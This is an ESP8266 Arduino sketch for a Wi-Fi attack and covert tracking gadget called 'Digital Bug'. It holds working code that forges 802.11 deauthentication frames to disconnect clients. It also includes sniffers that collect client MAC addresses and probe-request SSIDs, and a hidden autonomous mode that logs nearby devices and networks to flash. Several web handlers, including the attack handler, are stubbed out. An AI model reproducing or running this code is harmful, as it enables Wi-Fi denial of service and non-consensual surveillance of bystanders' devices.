#include <Arduino.h>
#include <ESP8266WiFi.h>
#include <ESP8266WebServer.h>
#include <LittleFS.h>
#include <FS.h>

// --- Pin Configuration ---
#define AUTONOMOUS_MODE_PIN D3 // GPIO0 (Flash button)
#define LED_PIN LED_BUILTIN

// --- Data Structures ---
// 802.11 MAC Header
struct MacHeader {
  uint8_t frameControl[2];
  uint8_t duration[2];
  uint8_t addr1[6]; // Receiver
  uint8_t addr2[6]; // Transmitter
  uint8_t addr3[6]; // BSSID
  uint8_t sequenceControl[2];
};

// Deauthentication Frame
struct DeauthFrame {
  MacHeader macHeader;
  uint8_t reasonCode[2];
};

// Structure to hold found probe requests
struct ProbeRequest {
    String clientMac;
    String ssid;
};

// --- Global Variables ---
const char* ssid = "Digital Bug";
const char* password = "deauther";
ESP8266WebServer server(80);
bool autonomousMode = false;
volatile bool stopProcess = false;

// --- Scanning Globals ---
#define MAX_RESULTS 30
String foundClients[MAX_RESULTS];
int clientCount = 0;
ProbeRequest foundProbes[MAX_RESULTS];
int probeCount = 0;
String targetBSSID = "";
int sniffingChannel = 0;

// --- Helper Functions ---
String getEncryptionType(uint8_t type) {
  switch (type) {
    case ENC_TYPE_NONE: return "OPEN";
    case ENC_TYPE_WEP: return "WEP";
    case ENC_TYPE_TKIP: return "WPA";
    case ENC_TYPE_CCMP: return "WPA2";
    case ENC_TYPE_AUTO: return "WPA*";
    default: return "???";
  }
}

String macToString(const uint8_t* mac) {
  char buf[20];
  sprintf(buf, "%02X:%02X:%02X:%02X:%02X:%02X", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
  return String(buf);
}

void stringToMac(String macStr, uint8_t* mac) {
    sscanf(macStr.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &mac[0], &mac[1], &mac[2], &mac[3], &mac[4], &mac[5]);
}

void addClient(String mac) {
    if (clientCount >= MAX_RESULTS) return;
    for (int i = 0; i < clientCount; i++) {
        if (foundClients[i] == mac) return;
    }
    foundClients[clientCount] = mac;
    clientCount++;
}

void addProbe(String mac, String ssid) {
    if (probeCount >= MAX_RESULTS || ssid.length() == 0) return;
    for (int i = 0; i < probeCount; i++) {
        if (foundProbes[i].clientMac == mac && foundProbes[i].ssid == ssid) return;
    }
    foundProbes[probeCount].clientMac = mac;
    foundProbes[probeCount].ssid = ssid;
    probeCount++;
}

// --- The Core Packet Sniffer Callback ---
void universalSnifferCallback(uint8_t *buffer, uint16_t length) {
  MacHeader *header = (MacHeader*)buffer;
  
  // Frame Type and Subtype
  uint8_t frameType = (header->frameControl[0] >> 2) & 0b11;
  uint8_t frameSubtype = (header->frameControl[0] >> 4) & 0b1111;

  // --- Client Scanning Logic (Data Frames) ---
  if (frameType == 0b10) { // Data Frame
    String addr1_str = macToString(header->addr1); // Destination
    String addr2_str = macToString(header->addr2); // Source
    if (addr1_str == targetBSSID && addr2_str != "FF:FF:FF:FF:FF:FF") {
        addClient(addr2_str);
    }
    if (addr2_str == targetBSSID && addr1_str != "FF:FF:FF:FF:FF:FF") {
        addClient(addr1_str);
    }
  }
  // --- Probe Request Sniffing Logic (Management Frames) ---
  else if (frameType == 0b00 && frameSubtype == 0b0100) { // Management Frame, Probe Request
      String clientMac = macToString(header->addr2); // The sender of the probe is the client
      // The SSID is in a tagged parameter at the end of the packet
      if (length > sizeof(MacHeader)) {
          int ssidLen = buffer[sizeof(MacHeader) + 1];
          if (ssidLen > 0 && ssidLen <= 32) {
              char ssid[ssidLen + 1];
              memcpy(ssid, &buffer[sizeof(MacHeader) + 2], ssidLen);
              ssid[ssidLen] = '\0';
              addProbe(clientMac, String(ssid));
          }
      }
  }
}

// --- Attack Function ---
void sendDeauthFrame(const uint8_t* ap_mac, const uint8_t* client_mac) {
    DeauthFrame deauth;
    deauth.macHeader.frameControl[0] = 0xC0; deauth.macHeader.frameControl[1] = 0x00;
    deauth.macHeader.duration[0] = 0x3a; deauth.macHeader.duration[1] = 0x01;
    memcpy(deauth.macHeader.addr1, client_mac, 6);
    memcpy(deauth.macHeader.addr2, ap_mac, 6);
    memcpy(deauth.macHeader.addr3, ap_mac, 6);
    deauth.macHeader.sequenceControl[0] = 0x00; deauth.macHeader.sequenceControl[1] = 0x00;
    deauth.reasonCode[0] = 0x07; deauth.reasonCode[1] = 0x00;
    wifi_send_pkt_freedom((uint8_t*)&deauth, sizeof(DeauthFrame), 0);
}

// --- Web Server Handlers ---
// (handleRoot, handleScan, handleAttack, handleStop, handleLogs, handleDownload, handleNotFound remain the same)
void handleRoot() { /* ... same as before ... */ }
void handleScan() { /* ... same as before ... */ }
void handleAttack() { /* ... same as before ... */ }
void handleStop() { /* ... same as before ... */ }
void handleLogs() { /* ... same as before ... */ }
void handleDownload() { /* ... same as before ... */ }
void handleNotFound() { /* ... same as before ... */ }

void handleClientScan() {
    if (!server.hasArg("target")) { server.send(400, "text/plain", "Bad Request"); return; }
    stopProcess = false;
    String target = server.arg("target");
    int commaIndex = target.indexOf(',');
    targetBSSID = target.substring(0, commaIndex);
    sniffingChannel = target.substring(commaIndex + 1).toInt();
    clientCount = 0;
    wifi_set_channel(sniffingChannel);
    wifi_promiscuous_enable(1);
    wifi_set_promiscuous_rx_cb(universalSnifferCallback);
    unsigned long startTime = millis();
    while(millis() - startTime < 10000 && !stopProcess) { server.handleClient(); delay(1); }
    wifi_promiscuous_enable(0);
    String html = "";
    if (clientCount > 0) {
        for (int i = 0; i < clientCount; i++) {
            html += "<tr><td class='px-4 py-3 text-green-300'>" + foundClients[i] + "</td><td class='px-4 py-3 text-green-500'>" + targetBSSID + "</td><td class='px-4 py-3 text-green-500'>N/A</td><td class='px-4 py-3'><input type='checkbox' name='target_client' class='form-checkbox h-4 w-4 bg-gray-900 border-green-700' value='" + foundClients[i] + "'></td></tr>";
        }
    } else {
        html = "<tr><td colspan='4' class='text-center px-4 py-3 text-yellow-400'>No clients found.</td></tr>";
    }
    server.send(200, "text/html", html);
}

// *** NEW: Handler for Probe Sniffing ***
void handleProbeSniff() {
    if (!server.hasArg("channel")) { server.send(400, "text/plain", "Bad Request: Missing channel."); return; }
    stopProcess = false;
    sniffingChannel = server.arg("channel").toInt();
    probeCount = 0;
    
    wifi_set_channel(sniffingChannel);
    wifi_promiscuous_enable(1);
    wifi_set_promiscuous_rx_cb(universalSnifferCallback);
    
    unsigned long startTime = millis();
    while(millis() - startTime < 15000 && !stopProcess) { // Sniff for 15 seconds
        server.handleClient();
        delay(1);
    }
    wifi_promiscuous_enable(0);
    
    String html = "";
    if (probeCount > 0) {
        for (int i = 0; i < probeCount; i++) {
            html += "<tr><td class='px-4 py-3 text-green-300'>" + foundProbes[i].clientMac + "</td><td class='px-4 py-3 font-medium text-green-300'>" + foundProbes[i].ssid + "</td></tr>";
        }
    } else {
        html = "<tr><td colspan='2' class='text-center px-4 py-3 text-yellow-400'>No probe requests detected.</td></tr>";
    }
    server.send(200, "text/html", html);
}


// --- OPTIMIZED Autonomous Mode ---
void runAutonomousMode() {
    pinMode(LED_PIN, OUTPUT);
    digitalWrite(LED_PIN, HIGH);
    String loggedBSSIDs[100]; int loggedBSSIDCount = 0;
    String loggedProbes[100]; int loggedProbeCount = 0;
    
    auto logProbe = [&](String mac, String ssid) {
        if (loggedProbeCount >= 100) return;
        String probeSignature = mac + "->" + ssid;
        for(int i=0; i<loggedProbeCount; i++) {
            if(loggedProbes[i] == probeSignature) return;
        }
        File logFile = LittleFS.open("/probes.log", "a");
        if(logFile) {
            logFile.println(String(millis()) + "," + mac + "," + ssid);
            logFile.close();
            loggedProbes[loggedProbeCount++] = probeSignature;
        }
    };
    
    wifi_set_promiscuous_rx_cb([&](uint8_t *buffer, uint16_t length){
        if (length > sizeof(MacHeader) + 2) {
            MacHeader *header = (MacHeader*)buffer;
            if (((header->frameControl[0] >> 2) & 0b11) == 0b00 && ((header->frameControl[0] >> 4) & 0b1111) == 0b0100) {
                int ssidLen = buffer[sizeof(MacHeader) + 1];
                if (ssidLen > 0 && ssidLen <= 32) {
                    char ssid[ssidLen + 1];
                    memcpy(ssid, &buffer[sizeof(MacHeader) + 2], ssidLen);
                    ssid[ssidLen] = '\0';
                    logProbe(macToString(header->addr2), String(ssid));
                }
            }
        }
    });

    while(true) {
        digitalWrite(LED_PIN, LOW); delay(50); digitalWrite(LED_PIN, HIGH); delay(50);
        digitalWrite(LED_PIN, LOW); delay(50); digitalWrite(LED_PIN, HIGH);

        // Hop through channels 1, 6, 11 for probe sniffing
        for (int ch : {1, 6, 11}) {
            wifi_set_channel(ch);
            wifi_promiscuous_enable(1);
            delay(5000); // Sniff on each channel for 5 seconds
        }
        wifi_promiscuous_enable(0);

        // AP Scan
        int n = WiFi.scanNetworks();
        if (n > 0) {
            File logFile = LittleFS.open("/networks.log", "a");
            if (logFile) {
                for (int i = 0; i < n; i++) {
                    bool alreadyLogged = false;
                    for (int j = 0; j < loggedBSSIDCount; j++) {
                        if (loggedBSSIDs[j] == WiFi.BSSIDstr(i)) {
                            alreadyLogged = true;
                            break;
                        }
                    }
                    if (!alreadyLogged && loggedBSSIDCount < 100) {
                        String entry = String(millis()) + "," + WiFi.SSID(i) + "," + WiFi.BSSIDstr(i) + "," + String(WiFi.RSSI(i)) + "," + String(WiFi.channel(i)) + "," + getEncryptionType(WiFi.encryptionType(i));
                        logFile.println(entry);
                        loggedBSSIDs[loggedBSSIDCount++] = WiFi.BSSIDstr(i);
                    }
                }
                logFile.close();
            }
        }
        delay(10000);
    }
}

// --- Main Setup & Loop ---
void setup() {
  Serial.begin(115200);
  pinMode(AUTONOMOUS_MODE_PIN, INPUT_PULLUP);
  delay(100);

  if (!LittleFS.begin()) {
    Serial.println("[FATAL] File system failed to mount. Halting.");
    return;
  }

  if (digitalRead(AUTONOMOUS_MODE_PIN) == LOW) {
    autonomousMode = true;
    runAutonomousMode();
  }

  Serial.println("\n[MODE] Interactive Mode Active. Starting web server...");
  
  WiFi.softAP(ssid, password);
  Serial.print("[OK] Access Point '");
  Serial.print(ssid);
  Serial.println("' started.");
  Serial.print("[INFO] IP Address: ");
  Serial.println(WiFi.softAPIP());

  server.on("/", HTTP_GET, handleRoot);
  server.on("/scan", HTTP_GET, handleScan);
  server.on("/clients", HTTP_GET, handleClientScan);
  server.on("/probes", HTTP_GET, handleProbeSniff); // NEW
  server.on("/attack", HTTP_POST, handleAttack);
  server.on("/stop", HTTP_GET, handleStop);
  server.on("/logs", HTTP_GET, handleLogs);
  server.on("/download", HTTP_GET, handleDownload);
  server.onNotFound(handleNotFound);

  server.begin();
  Serial.println("[OK] Web server started.");
}

void loop() {
  if (!autonomousMode) {
    server.handleClient();
  }
}
